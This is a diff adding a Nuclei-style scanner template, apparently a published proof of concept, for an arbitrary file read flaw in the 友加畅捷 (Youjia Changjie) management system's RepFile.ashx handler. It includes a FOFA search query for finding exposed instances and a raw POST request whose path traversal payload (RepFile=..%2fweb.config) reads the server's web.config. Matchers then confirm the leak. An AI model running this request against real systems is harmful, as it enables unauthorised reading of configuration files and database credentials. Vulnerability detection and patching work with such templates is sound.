@@ -1,0 +1,27 @@
+id: youjia-changjie-repfile-file-read
+
+info:
+  name: 友加畅捷管理系统 RepFile.ashx 任意文件访问漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
+        友加畅捷管理系统为小微商贸流通企业提供财务业务一体化解决方案，集成了进销存、财务、分销及移动管理等功能模块。该系统 RepFile.ashx 处理程序存在文件访问控制缺陷，攻击者可通过构造恶意请求绕过访问控制机制，读取目标服务器上的任意文件（如系统配置文件、数据库凭证等敏感数据）。该漏洞可能造成企业核心数据泄露，破坏系统机密性与完整性。
+  tags: 友加畅捷管理系统
+
+http:
+- raw:
+  - |
+    POST /ReportDesign/RepFile.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    RepFile=..%2fweb.config&Type=ReadReportCpfFile
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "<configSections>"
+        - "<configuration>"
+      condition: and
